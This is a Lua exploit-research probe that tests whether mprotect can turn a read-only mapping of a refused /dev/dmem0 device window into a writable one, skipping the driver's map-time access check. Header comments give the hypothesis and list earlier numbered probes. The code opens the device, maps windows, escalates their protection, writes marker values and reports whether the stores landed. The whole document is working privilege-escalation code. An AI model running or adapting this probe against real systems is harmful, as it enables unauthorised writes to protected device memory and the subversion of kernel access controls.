-- CRASH_CLASS: LOW
-- PROBE 1441a: mprotect escalation on the 64 GiB device window
--
-- 1412a measured a second /dev/dmem0 window at offset 0x1000000000 (64 GiB) that
-- is 16-64 MiB wide and accepts only prot 0 and prot 1: prot 2, 3, 5, 7 and 0x13
-- all answer EACCES at mmap time.  The low window at offsets 0..0x110000000
-- accepts prot 3 and stores land there (1396b/1397j).
--
-- If the driver's ACL is evaluated in d_mmap (map time) and the resulting page
-- protection is merely what the caller asked for, then mprotect after the fact
-- changes the PTE protection without re-running the ACL.  That would turn a
-- read-only foreign window into a writable one - write access to memory the
-- caller was explicitly refused.
--
-- Blocks:
--   [A] find the high window (mmap prot 1 at 64 GiB + k*16 MiB, k = 0..8)
--   [B] mprotect it to 3, check 547, store, read back, read through a second map
--   [C] control: the low window, mmap prot 1 then mprotect to 3 (does mprotect
--       work on a device mapping at all?)
--   [D] control: mmap prot 0 then mprotect to 3
--   [E] survivor check
--
-- Prior art:
--   1410a/1411a/1412a  results/phase36_realargs/  (window extent, prot refusals)
--   423a   probes/phase17_new_vectors/423a_mprotect_prot_sweep.lua (prot values)
--   1396b/1397j        results/phase36_realargs/ (low window stores land)
--   docs/DMEM_WINDOW_14_10.md

print("=== PROBE 1441a: MPROTECT ESCALATION ON THE 64 GiB WINDOW ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function rd(p)
    local ok, v = pcall(function() return to_num(memory.read_dword(p)) end)
    if ok then return v end
    return nil
end
local function wr(p, v) pcall(function() memory.write_dword(p, v) end) end
local function str_addr(s)
    local p = memory.alloc(#s + 1)
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    memory.write_byte(p + #s, 0)
    return p
end

local m5, m74, m477, m547 = sc(5), sc(74), sc(477), sc(547)
local fd = to_num(m5(uint64(str_addr("/dev/dmem0")), uint64(0x4002), uint64(0)))
print(string.format("open(/dev/dmem0) -> %d", fd))

local function mmap(off, len, prot, flags)
    local ok, r = pcall(function()
        return m477(uint64(0), uint64(len), uint64(prot), uint64(flags or 1),
            uint64(fd), uint64(off))
    end)
    if not ok then return nil, "EXC" end
    local v = to_num(r)
    if v < 0x10000 or v > 0x8000000000 then return nil, es() end
    return v
end

local function mprot(va, len, prot)
    local ok, r = pcall(function()
        return m74(uint64(va), uint64(len), uint64(prot))
    end)
    if not ok then return "EXC" end
    return to_num(r)
end

-- query_memory_protection(547): record is {start,end,prot,...}; read the prot word
local function qprot(va)
    local pg = memory.alloc(0x100)
    for i = 0, 0x3F do pcall(function() memory.write_dword(pg + i * 4, 0) end) end
    pcall(function() m547(uint64(va), uint64(pg), uint64(0x100), uint64(0)) end)
    return rd(pg), rd(pg + 8)
end

print("[A] mmap prot 1 at 64 GiB + k*16 MiB, len 0x1000")
local hi_va, hi_off = nil, nil
for k = 0, 8 do
    local off = 0x1000000000 + k * 0x1000000
    local va, e = mmap(off, 0x1000, 1)
    print(string.format("  off %#013x -> %s%s", off,
        va and string.format("%#x", va) or "FAILED", va and "" or ("  (" .. tostring(e) .. ")")))
    if va and not hi_va then hi_va, hi_off = va, off end
end
print("")

if hi_va then
    print(string.format("[B] escalate %#x (offset %#013x) to prot 3", hi_va, hi_off))
    local p0, p8 = qprot(hi_va)
    print(string.format("  547 before: w0=%d w8=%d", p0 or -1, p8 or -1))
    local d0 = rd(hi_va)
    print(string.format("  first dword %08X", d0 or 0))
    local r = mprot(hi_va, 0x1000, 3)
    print(string.format("  mprotect(3) -> %s (%s)", tostring(r), es()))
    local q0, q8 = qprot(hi_va)
    print(string.format("  547 after : w0=%d w8=%d", q0 or -1, q8 or -1))
    wr(hi_va, 0xA5A5A5A5)
    local rb = rd(hi_va)
    print(string.format("  store A5A5A5A5 -> read %08X %s", rb or 0,
        (rb == 0xA5A5A5A5) and "<<< STORE LANDED" or "(store did not land)"))
    local va2, e2 = mmap(hi_off, 0x1000, 1)
    if va2 then
        print(string.format("  second ro mapping %#x reads %08X", va2, rd(va2) or 0))
    else
        print(string.format("  second mapping FAILED (%s)", tostring(e2)))
    end
    -- also try prot values the driver refused, through mprotect
    for _, pv in ipairs({2, 5, 7}) do
        local rv = mprot(hi_va, 0x1000, pv)
        print(string.format("  mprotect(%d) -> %s (%s)", pv, tostring(rv), es()))
    end
    print("")
else
    print("[B] skipped: no high-window mapping")
    print("")
end

print("[C] control: low window, mmap prot 1 then mprotect to 3")
local lo, le = mmap(0, 0x1000, 1)
if lo then
    print(string.format("  mmap prot 1 -> %#x  first dword %08X", lo, rd(lo) or 0))
    local r = mprot(lo, 0x1000, 3)
    print(string.format("  mprotect(3) -> %s (%s)", tostring(r), es()))
    wr(lo, 0xDEAD1234)
    local rb = rd(lo)
    print(string.format("  store -> %08X %s", rb or 0,
        (rb == 0xDEAD1234) and "<<< LANDED" or "(did not land)"))
else
    print(string.format("  mmap prot 1 FAILED (%s)", tostring(le)))
end
print("")

print("[D] control: mmap prot 0 then mprotect to 3")
local z, ze = mmap(0x10000000, 0x1000, 0)
if z then
    print(string.format("  mmap prot 0 -> %#x", z))
    local r = mprot(z, 0x1000, 3)
    print(string.format("  mprotect(3) -> %s (%s)", tostring(r), es()))
    wr(z, 0xFEED9876)
    local rb = rd(z)
    print(string.format("  store -> %s %s", rb and string.format("%08X", rb) or "READ-FAILED",
        (rb == 0xFEED9876) and "<<< LANDED" or "(did not land)"))
else
    print(string.format("  mmap prot 0 FAILED (%s)", tostring(ze)))
end
print("")

print("[E] survivor check")
print(string.format("  low-window page reads %s", rd(lo) and string.format("%08X", rd(lo)) or "nil"))
print("")
print("=== PROBE 1441a COMPLETE ===")
